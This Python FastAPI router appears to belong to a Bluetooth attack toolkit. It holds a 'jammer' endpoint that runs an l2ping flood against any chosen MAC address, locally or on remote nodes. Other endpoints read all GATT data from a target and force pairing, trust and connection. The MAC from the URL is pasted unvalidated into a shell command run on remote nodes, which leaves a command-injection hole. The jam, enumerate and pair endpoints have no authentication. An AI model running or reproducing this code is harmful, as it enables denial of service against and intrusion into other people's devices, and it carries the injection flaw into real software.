from fastapi import APIRouter, WebSocket, WebSocketDisconnect
import asyncio
import logging
import json
from ..core.bluetooth import discovered_devices, bluetooth_queue

logger = logging.getLogger("bluetooth_router")
router = APIRouter(prefix="/api/bluetooth", tags=["bluetooth"])

bluetooth_clients = []
_bluetooth_broadcast_task = None

async def broadcast_bluetooth():
    while True:
        try:
            event = await bluetooth_queue.get()
            if not bluetooth_clients:
                continue
                
            message = json.dumps(event)
            disconnected = []
            for client in bluetooth_clients:
                try:
                    await client.send_text(message)
                except Exception:
                    disconnected.append(client)
                    
            for client in disconnected:
                if client in bluetooth_clients:
                    bluetooth_clients.remove(client)
        except Exception as e:
            logger.error(f"Error in Bluetooth WS broadcast: {e}")
            await asyncio.sleep(1)

@router.on_event("startup")
async def on_startup():
    global _bluetooth_broadcast_task
    _bluetooth_broadcast_task = asyncio.create_task(broadcast_bluetooth())

@router.websocket("/ws")
async def bluetooth_ws(websocket: WebSocket):
    from .auth import authenticate_ws
    if await authenticate_ws(websocket) is None:
        return
    await websocket.accept()
    bluetooth_clients.append(websocket)
    
    # Send initial state
    try:
        await websocket.send_text(json.dumps({
            "type": "init",
            "devices": list(discovered_devices.values())
        }))
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        if websocket in bluetooth_clients:
            bluetooth_clients.remove(websocket)

@router.get("/devices")
async def get_bluetooth_devices():
    return {"devices": list(discovered_devices.values())}

jam_tasks = {}

@router.post("/jam/{mac}")
async def engage_jammer(mac: str, node_id: str = None):
    mac = mac.upper()
    if mac in jam_tasks:
        return {"status": "already jamming", "mac": mac}
    
    logger.warning(f"Engaging L2Ping Flood Jammer on {mac} (Node: {node_id})")
    try:
        if node_id:
            from .nodes import execute_commands_on_node
            # Run in background via nohup
            cmd = f"nohup l2ping -f -s 600 {mac} >/dev/null 2>&1 &"
            await execute_commands_on_node(node_id, [cmd])
            jam_tasks[mac] = {"node_id": node_id, "type": "remote"}
        else:
            import subprocess
            proc = subprocess.Popen(["l2ping", "-f", "-s", "600", mac], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            jam_tasks[mac] = {"proc": proc, "type": "local"}
        return {"status": "jamming engaged", "mac": mac, "method": "l2ping_flood"}
    except Exception as e:
        logger.error(f"Failed to start jammer on {mac}: {e}")
        return {"error": str(e), "status": "failed"}

@router.post("/unjam/{mac}")
async def stop_jammer(mac: str, node_id: str = None):
    mac = mac.upper()
    if mac in jam_tasks:
        task = jam_tasks.pop(mac)
        if task["type"] == "remote":
            from .nodes import execute_commands_on_node
            cmd = f"pkill -f 'l2ping -f -s 600 {mac}'"
            await execute_commands_on_node(task["node_id"], [cmd])
        else:
            task["proc"].terminate()
            
        logger.warning(f"Stopped Jammer on {mac}")
        return {"status": "jamming stopped", "mac": mac}
    return {"status": "not jamming", "mac": mac}

@router.post("/enumerate/{mac}")
async def enumerate_device(mac: str):
    import asyncio
    from bleak import BleakClient, BleakScanner
    
    try:
        # Force bluez to scan so it populates its D-Bus cache with the device
        proc_scan = await asyncio.create_subprocess_exec("bluetoothctl", "--timeout", "3", "scan", "on")
        await proc_scan.wait()
        
        device = await BleakScanner.find_device_by_address(mac, timeout=5.0)
    except:
        pass

    logger.info(f"Enumerating device {mac}...")
    try:
        async with BleakClient(mac, timeout=15.0) as client:
            services = client.services
            enum_data = {}
            for service in services:
                srv_uuid = service.uuid
                srv_data = {"uuid": srv_uuid, "description": service.description, "characteristics": {}}
                for char in service.characteristics:
                    if "read" in char.properties:
                        try:
                            val = await client.read_gatt_char(char.uuid)
                            try:
                                # Try decoding as utf-8 (good for device info like Manufacturer Name)
                                decoded = val.decode('utf-8')
                                # Strip null bytes
                                decoded = decoded.replace('\x00', '')
                                srv_data["characteristics"][char.description or char.uuid] = decoded
                            except Exception:
                                srv_data["characteristics"][char.description or char.uuid] = val.hex()
                        except Exception as e:
                            srv_data["characteristics"][char.description or char.uuid] = f"Error reading: {e}"
                enum_data[srv_uuid] = srv_data
            return {"status": "success", "mac": mac, "services": enum_data}
    except Exception as e:
        logger.error(f"Enumeration failed for {mac}: {e}")
        return {"status": "error", "mac": mac, "error": str(e)}

@router.post("/pair/{mac}")
async def pair_device(mac: str):
    import asyncio
    mac = mac.upper()
    logger.info(f"Initiating pairing with {mac}...")
    try:
        # First check if already paired
        proc_info = await asyncio.create_subprocess_exec(
            "bluetoothctl", "info", mac,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout_info, _ = await asyncio.wait_for(proc_info.communicate(), timeout=5.0)
        
        # If not paired, attempt pairing
        if b"Paired: yes" not in stdout_info:
            import time
            
            # Force bluez to scan so it populates its D-Bus cache with the device
            proc_scan = await asyncio.create_subprocess_exec("bluetoothctl", "--timeout", "3", "scan", "on")
            await proc_scan.wait()
            
            proc = await asyncio.create_subprocess_exec(
                "bluetoothctl",
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT
            )
            
            # Send commands to setup agent and pair
            commands = f"agent NoInputNoOutput\ndefault-agent\npair {mac}\n"
            proc.stdin.write(commands.encode())
            await proc.stdin.drain()
            
            out = ""
            start = time.time()
            pairing_successful = False
            
            while time.time() - start < 15.0:
                try:
                    line = await asyncio.wait_for(proc.stdout.readline(), timeout=1.0)
                    if not line:
                        break
                    decoded = line.decode()
                    out += decoded
                    
                    if "Pairing successful" in decoded:
                        pairing_successful = True
                        break
                    if "Failed to pair" in decoded:
                        break
                except asyncio.TimeoutError:
                    continue
                    
            try:
                proc.stdin.write(b"quit\n")
                await proc.stdin.drain()
                await proc.wait()
            except:
                pass
            
            # cancel if stuck
            if "InProgress" in out:
                await asyncio.create_subprocess_exec("bluetoothctl", "cancel-pairing", mac)
                return {"status": "failed", "message": "Pairing is already in progress. Please ensure the device is in pairing mode and try again."}
                
            if not pairing_successful:
                return {"status": "failed", "message": out.strip()[-200:] or "Pairing failed (no output)"}

        # Trust and connect
        await asyncio.create_subprocess_exec("bluetoothctl", "trust", mac)
        await asyncio.create_subprocess_exec("bluetoothctl", "connect", mac)
        
        return {"status": "success", "message": "Device paired and connected successfully!"}
        
    except Exception as e:
        return {"status": "error", "message": str(e)}
